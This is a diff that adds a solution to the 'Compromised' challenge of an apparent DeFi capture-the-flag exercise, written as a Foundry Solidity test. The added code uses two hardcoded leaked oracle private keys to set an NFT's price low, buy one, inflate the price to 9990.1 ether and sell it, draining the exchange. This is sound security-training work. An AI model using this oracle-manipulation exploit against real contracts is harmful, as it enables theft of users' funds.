@@ -77,6 +77,29 @@ contract Compromised is Test {
          * EXPLOIT START *
          */
 
+        uint256 compromisedKey1 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+        uint256 compromisedKey2 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+        address oracle1 = vm.addr(compromisedKey1);
+        address oracle2 = vm.addr(compromisedKey2);
+        vm.startPrank(oracle1);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+        changePrank(oracle2);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+        changePrank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+        changePrank(oracle1);
+        trustfulOracle.postPrice("DVNFT", 9990.1 ether);
+        changePrank(oracle2);
+        trustfulOracle.postPrice("DVNFT", 9990.1 ether);
+        changePrank(attacker);
+        exchange.token().approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        changePrank(oracle1);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+        changePrank(oracle2);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
